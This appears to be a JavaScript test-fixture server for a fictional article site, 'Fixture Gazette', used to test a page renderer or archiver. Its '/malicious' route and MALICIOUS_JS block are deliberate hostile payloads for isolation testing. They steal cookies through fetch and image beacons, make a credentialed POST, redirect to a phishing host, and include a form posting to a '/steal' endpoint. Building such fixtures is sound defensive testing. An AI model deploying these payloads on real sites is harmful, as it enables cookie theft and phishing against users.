// Site 1: realistic article site. See README.md for the route list.
import { startSite, esc, html, text, json, send, sendCond, notFound, makePng, makeIco, hexToRgb, hash32 } from './lib.mjs';
import { ARTICLES, bySlug, paragraphs, FACTS, CODE, authorFor, ONLINE_ONLY } from './articles-data.mjs';

const CSS_MAIN = `@import url("/assets/base.css");
@import "/assets/print.css" print;
@font-face { font-family: "Fixture Serif"; src: url("/assets/fonts/fixture.woff2") format("woff2"), url('/assets/fonts/fixture.woff') format("woff"); font-display: swap; }
body { font-family: "Fixture Serif", Georgia, serif; background: #fff url("/img/bg.png") repeat; color: #222; }
.hero { background-image: url(/img/hero.png); background-size: cover; }
.sidebar { background: url("../img/gen/8x8-ccddee.png"); }
`;
const CSS_BASE = `@import url("typography.css");
.layout { display: flex; gap: 2rem; } nav a { margin-right: 1rem; } footer { border-top: 1px solid #ccc; }
`;
const CSS_TYPO = `h1, h2, h3 { font-family: "Fixture Serif", serif; } code, pre { font-family: monospace; background: #f4f4f4; }\n`;
const CSS_PRINT = `nav, aside, footer { display: none; }\n`;

const FONT_WOFF2 = Buffer.concat([Buffer.from('wOF2'), Buffer.alloc(124, 7)]);
const FONT_WOFF = Buffer.concat([Buffer.from('wOFF'), Buffer.alloc(124, 9)]);

const NAV = [['/', 'Home'], ['/articles', 'All articles'], ['/astronomy', 'Astronomy'], ['/renewable-energy', 'Renewable energy'], ['/about', 'About']];

function jsonLd(origin, a, canonical) {
  return {
    '@context': 'https://schema.org',
    '@type': 'Article',
    headline: a.title,
    datePublished: a.published,
    dateModified: a.modified,
    inLanguage: a.lang || 'en',
    author: { '@type': 'Person', name: authorFor(a.slug) },
    publisher: { '@type': 'Organization', name: 'Fixture Gazette' },
    mainEntityOfPage: canonical,
    image: `${origin}/img/hero.png`,
  };
}

function layout(origin, { title, lang = 'en', canonical, head = '', body, cssHref = '/assets/site.css', desc = '' }) {
  return `<!doctype html>
<html lang="${lang}">
<head>
<meta charset="utf-8">
<title>${esc(title)} | Fixture Gazette</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="${esc(desc)}">
${canonical ? `<link rel="canonical" href="${esc(canonical)}">` : ''}
<link rel="stylesheet" href="${cssHref}">
<link rel="icon" href="/favicon.ico">
${head}
</head>
<body>
<header class="site-header"><a href="/" class="brand">Fixture Gazette</a>
<nav aria-label="Primary">${NAV.map(([h, t]) => `<a href="${h}">${t}</a>`).join(' ')}</nav></header>
${body}
<footer class="site-footer"><p>&copy; 2025 Fixture Gazette. <a href="/about">About</a> · <a href="/articles">Archive</a> · <a href="/feed-not-here">Feed</a></p></footer>
</body></html>`;
}

function articleBody(origin, a) {
  const paras = paragraphs(a, 4);
  const facts = FACTS[a.topic];
  const author = authorFor(a.slug);
  const related = ARTICLES.filter((x) => x.topic === a.topic && x.slug !== a.slug && !x.copyOf && !x.lang).slice(0, 5);
  const lead = a.lead || paragraphs({ ...a, lead: undefined }, 1)[0];
  const fr = a.lang === 'fr';
  return `<div class="layout">
<main>
<article id="main-article" itemscope itemtype="https://schema.org/Article">
<h1 itemprop="headline">${esc(a.title)}</h1>
<p class="byline">${fr ? 'Par' : 'By'} <span itemprop="author">${author}</span> · <time datetime="${a.published}" itemprop="datePublished">${a.published.slice(0, 10)}</time></p>
<p class="lead">${esc(lead)}</p>
<figure class="hero"><img src="/img/hero.png" alt="${esc(a.title)} illustration" width="64" height="32"
 srcset="/img/hero-480.png 480w, /img/hero-960.png 960w, /img/hero.png 1x" sizes="(max-width: 600px) 480px, 960px"
 style="border:1px solid #ccc;background:url('/img/bg.png')">
<figcaption>Figure 1. ${esc(a.title)}: an illustrative generated image.</figcaption></figure>
<h2 id="overview">${fr ? 'Aperçu' : 'Overview'}</h2>
<p>${esc(paras[0])}</p>
<p>${esc(paras[1])} See also <a href="/${related[0]?.slug || 'astronomy'}">${esc(related[0]?.title || 'Astronomy')}</a>.</p>
<h2 id="key-facts">${fr ? 'Faits clés' : 'Key facts'}</h2>
<ul>${facts.map(([k, v]) => `<li><strong>${esc(k)}</strong>: ${esc(v)}</li>`).join('')}</ul>
<ol><li>Observe</li><li>Measure</li><li>Compare with the <a href="#references">references</a></li></ol>
<h2 id="data">Data</h2>
<table><caption>Selected values for ${esc(a.title)}</caption>
<thead><tr><th>Item</th><th>Value</th></tr></thead>
<tbody>${facts.map(([k, v]) => `<tr><td>${esc(k)}</td><td>${esc(v)}</td></tr>`).join('')}</tbody></table>
<h2 id="method">Method</h2>
<p>${esc(paras[2])}</p>
<pre><code class="language-text">${esc(CODE[a.topic])}</code></pre>
<figure><img src="/img/diagram.png" alt="Diagram" width="48" height="24"><figcaption>Figure 2. A generated diagram, shared by many pages.</figcaption></figure>
<blockquote><p>${esc(paras[3])}</p></blockquote>
<h2 id="references">References</h2>
<ol class="references">
<li id="ref1"><cite>Marlowe, A. (2024). <em>${esc(a.title)}: an introduction</em>.</cite> <a href="https://example.org/ref/${a.slug.replace('/', '-')}-1">example.org</a></li>
<li id="ref2"><cite>Ferreira, T. (2023). <em>Notes on ${esc(a.title)}</em>.</cite> <a href="https://example.org/ref/${a.slug.replace('/', '-')}-2">example.org</a></li>
</ol>
</article>
</main>
<aside class="sidebar" aria-label="Related">
<h2>Related articles</h2>
<ul>${related.map((r) => `<li><a href="/${r.slug}">${esc(r.title)}</a></li>`).join('')}</ul>
<div class="ad" style="width:120px;height:60px">Sponsored: nothing</div>
</aside>
</div>`;
}

function renderArticle(origin, a) {
  const canonical = `${origin}/${bySlug[a.canonicalOf]?.slug || a.slug}`;
  const desc = (a.lead || paragraphs(a, 1)[0]).slice(0, 150);
  const head = `<meta property="og:type" content="article">
<meta property="og:title" content="${esc(a.title)}">
<meta property="og:description" content="${esc(desc)}">
<meta property="og:url" content="${canonical}">
<meta property="og:image" content="${origin}/img/hero.png">
<meta property="og:site_name" content="Fixture Gazette">
<meta property="article:published_time" content="${a.published}">
<meta property="article:modified_time" content="${a.modified}">
<meta name="twitter:card" content="summary_large_image">
<script type="application/ld+json">${JSON.stringify(jsonLd(origin, a, canonical))}</script>
<style>.lead { font-size: 1.1em; background-image: url("/img/gen/4x4-ffeecc.png"); }</style>`;
  return layout(origin, { title: a.title, lang: a.lang || 'en', canonical, head, body: articleBody(origin, a), desc });
}

const MALICIOUS_JS = (appApi) => `
// Hostile page script for rendering-isolation tests. Everything here must be neutralised.
try { fetch(${JSON.stringify(appApi)}, { method: 'POST', credentials: 'include', body: 'pwned' }); } catch (e) {}
try { fetch('/__beacon?kind=fetch-self&cookie=' + encodeURIComponent(document.cookie)); } catch (e) {}
try { new Image().src = '/__beacon?kind=image&cookie=' + encodeURIComponent(document.cookie); } catch (e) {}
try { top.location = 'http://evil.example.invalid/phish'; } catch (e) {}
try { window.parent.postMessage('hello from malicious fixture', '*'); } catch (e) {}
try { localStorage.setItem('stolen', document.cookie); } catch (e) {}
document.title = 'pwned';
`;

export async function startArticle({ appApiUrl = 'http://127.0.0.1:3000/api/evil-probe' } = {}) {
  const beacons = [];
  const site = await startSite('article', (req, res, url) => {
    const origin = site.origin;
    const p = url.pathname;
    const cache = { 'Cache-Control': 'public, max-age=3600' };

    if (p === '/__beacon') {
      beacons.push({ query: Object.fromEntries(url.searchParams), ua: req.headers['user-agent'] || null });
      return send(res, 204);
    }
    if (p === '/__beacons') return json(res, beacons);

    // ---- assets
    if (p === '/assets/site.css' || p === '/assets/site-copy.css')
      return sendCond(req, res, 200, CSS_MAIN, { 'Content-Type': 'text/css; charset=utf-8', ...cache });
    if (p === '/assets/base.css') return sendCond(req, res, 200, CSS_BASE, { 'Content-Type': 'text/css', ...cache });
    if (p === '/assets/typography.css') return sendCond(req, res, 200, CSS_TYPO, { 'Content-Type': 'text/css', ...cache });
    if (p === '/assets/print.css') return sendCond(req, res, 200, CSS_PRINT, { 'Content-Type': 'text/css', ...cache });
    if (p === '/assets/fonts/fixture.woff2') return sendCond(req, res, 200, FONT_WOFF2, { 'Content-Type': 'font/woff2', ...cache });
    if (p === '/assets/fonts/fixture.woff') return sendCond(req, res, 200, FONT_WOFF, { 'Content-Type': 'font/woff', ...cache });
    if (p === '/favicon.ico') return sendCond(req, res, 200, makeIco(), { 'Content-Type': 'image/x-icon', ...cache });
    const png = {
      '/img/hero.png': [64, 32, [40, 90, 200]],
      '/img/hero-copy.png': [64, 32, [40, 90, 200]], // byte-identical to hero.png (dedup tests)
      '/img/hero-480.png': [48, 24, [40, 90, 200]],
      '/img/hero-960.png': [96, 48, [40, 90, 200]],
      '/img/bg.png': [4, 4, [240, 240, 235]],
      '/img/diagram.png': [48, 24, [20, 140, 90]],
    }[p];
    if (png) return sendCond(req, res, 200, makePng(...png), { 'Content-Type': 'image/png', ...cache });
    let m = p.match(/^\/img\/gen\/(\d{1,3})x(\d{1,3})-([0-9a-f]{6})\.png$/);
    if (m) return sendCond(req, res, 200, makePng(+m[1], +m[2], hexToRgb(m[3])), { 'Content-Type': 'image/png', ...cache });

    // ---- pages
    if (p === '/') {
      const picks = ARTICLES.filter((a) => !a.copyOf && !a.lang).slice(0, 12);
      return html(res, layout(origin, {
        title: 'Home',
        canonical: `${origin}/`,
        body: `<main><h1>Fixture Gazette</h1><p>Deterministic articles for tests.</p><ul>${picks.map((a) => `<li><a href="/${a.slug}">${esc(a.title)}</a></li>`).join('')}</ul></main>`,
      }));
    }
    if (p === '/articles') {
      return html(res, layout(origin, {
        title: 'All articles',
        canonical: `${origin}/articles`,
        body: `<main><h1>All articles</h1><ul>${ARTICLES.map((a) => `<li><a href="/${a.slug}">${esc(a.title)}</a> <small>${a.published.slice(0, 10)}</small></li>`).join('')}</ul></main>`,
      }));
    }
    // A page that cites Wikipedia articles in several address forms (task Z-06: the links open the package copy offline).
    if (p === '/cites-wikipedia') {
      return html(res, layout(origin, {
        title: 'Reading list: aromatic chemistry',
        canonical: `${origin}/cites-wikipedia`,
        body: `<main><h1>Reading list: aromatic chemistry</h1><p>Start with <a id="w-benzene" href="https://en.wikipedia.org/wiki/Benzene">Benzene</a>, then <a id="w-toluene" href="https://en.m.wikipedia.org/wiki/Toluene">Toluene</a> on a phone address, and <a id="w-index" href="https://en.wikipedia.org/w/index.php?title=Aromaticity">Aromaticity</a> by title. Not in any package: <a id="w-missing" href="https://en.wikipedia.org/wiki/Zirconium">Zirconium</a>.</p></main>`,
      }));
    }
    if (p === '/about') {
      return html(res, layout(origin, { title: 'About', canonical: `${origin}/about`, body: '<main><h1>About</h1><p>Fixture Gazette is not a real publication.</p></main>' }));
    }
    // ---- script-built pages (renderer tests). The server sends an empty shell; the article is inserted by script.
    if (p === '/js-only' || p === '/js-only/big') {
      const big = p === '/js-only/big';
      // `big` has no recognisable mount id, but is a large bundle shell, so only the "little text" trigger fires.
      const pad = big ? `<!-- ${'bundle '.repeat(4000)} -->\n` : '';
      const mount = big ? '<div class="shell-frame"></div>' : '<div id="root"></div>';
      return html(res, `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Aurora survey (script-built)</title>
<link rel="canonical" href="${origin}${p}"></head><body>${pad}${mount}<noscript>You need to enable JavaScript to run this app.</noscript>
<script src="/js-only/app.js"></script></body></html>`);
    }
    if (p === '/js-only/app.js') {
      return send(res, 200, `(function () {
  var mount = document.getElementById('root') || document.querySelector('.shell-frame');
  function show(data) {
    var h = document.createElement('main');
    h.innerHTML = '<article><h1>' + data.title + '</h1>' + data.paragraphs.map(function (t) { return '<p>' + t + '</p>'; }).join('') + '</article>';
    mount.appendChild(h);
  }
  fetch('/js-only/data.json').then(function (r) { return r.json(); }).then(show);
})();
`, { 'Content-Type': 'text/javascript' });
    }
    // A script-heavy page for memory measurements: a 1.5 MB JSON payload and 30,000 table rows built by script.
    if (p === '/js-only/heavy') {
      return html(res, `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Heavy script-built table</title></head><body><div id="root"></div>
<script src="/js-only/heavy.js"></script></body></html>`);
    }
    if (p === '/js-only/heavy.js') {
      return send(res, 200, `(function () {
  fetch('/js-only/heavy.json').then(function (r) { return r.json(); }).then(function (rows) {
    var t = document.createElement('table'), b = document.createElement('tbody');
    rows.forEach(function (r) {
      var tr = document.createElement('tr');
      r.forEach(function (c) { var td = document.createElement('td'); td.textContent = c; tr.appendChild(td); });
      b.appendChild(tr);
    });
    t.appendChild(b);
    document.getElementById('root').appendChild(t);
    window.__rows = rows;
  });
})();
`, { 'Content-Type': 'text/javascript' });
    }
    if (p === '/js-only/heavy.json') {
      const rows = [];
      for (let i = 0; i < 30000; i++) rows.push([`row-${i}`, `value ${hash32('v' + i) % 100000}`, `note ${hash32('n' + i) % 977}`]);
      return json(res, rows);
    }
    if (p === '/js-only/data.json') {
      return json(res, {
        title: 'Aurora survey',
        paragraphs: [
          'The aurora survey recorded forty-one displays over the winter, and the brightest, on the ninth of January, filled the northern sky for almost two hours.',
          'Observers at the Kvaloya station noted that green emission dominated, with red fringes appearing above one hundred and fifty kilometres. The scriptbuilt marker phrase is lanternfish-migration-7731.',
          'Magnetometer traces showed the substorm onset eleven minutes before the first visible arc brightened, which matches the delay seen in earlier seasons.',
        ],
      });
    }
    if (p === '/malicious') {
      const body = `<main><article><h1>Totally safe article</h1><p>Some harmless text about astronomy.</p>
<form id="evil-form" action="http://127.0.0.1:9/steal" method="post"><input name="q" value="secret"><button>Go</button></form>
<a href="javascript:alert(document.cookie)">click me</a>
<img src="/img/hero.png" onerror="fetch('/__beacon?kind=onerror')" onload="fetch('/__beacon?kind=onload')">
<iframe src="/about" style="display:none"></iframe>
<meta http-equiv="refresh" content="30;url=http://evil.example.invalid/">
<script>${MALICIOUS_JS(appApiUrl)}</script>
<script src="/malicious.js"></script></article></main>`;
      return html(res, layout(origin, { title: 'Malicious page', canonical: `${origin}/malicious`, body }), 200, { 'Set-Cookie': 'fixture_session=secret-cookie-value; Path=/' });
    }
    if (p === '/malicious.js') return send(res, 200, MALICIOUS_JS(appApiUrl), { 'Content-Type': 'text/javascript' });
    if (p === '/dedup/a' || p === '/dedup/b') {
      const b = p.endsWith('b');
      const body = `<main><article><h1>Dedup page ${b ? 'B' : 'A'}</h1><p>Different text on each page, same CSS and image bytes.</p><img src="${b ? '/img/hero-copy.png' : '/img/hero.png'}" alt="shared" width="64" height="32"></article></main>`;
      return html(res, layout(origin, { title: `Dedup ${b ? 'B' : 'A'}`, body, cssHref: b ? '/assets/site-copy.css' : '/assets/site.css' }));
    }
    m = p.match(/^\/online-only\/(\d+)$/);
    if (m) {
      const o = ONLINE_ONLY.find((x) => x.id === +m[1]);
      if (!o) return notFound(res);
      return html(res, layout(origin, { title: o.title, body: `<main><article><h1>${esc(o.title)}</h1><p>${esc(o.snippet)}</p></article></main>` }));
    }
    const slug = p.slice(1);
    const a = bySlug[slug];
    if (a) return sendCond(req, res, 200, renderArticle(origin, a), { 'Content-Type': 'text/html; charset=utf-8' });
    return notFound(res);
  });
  return site;
}
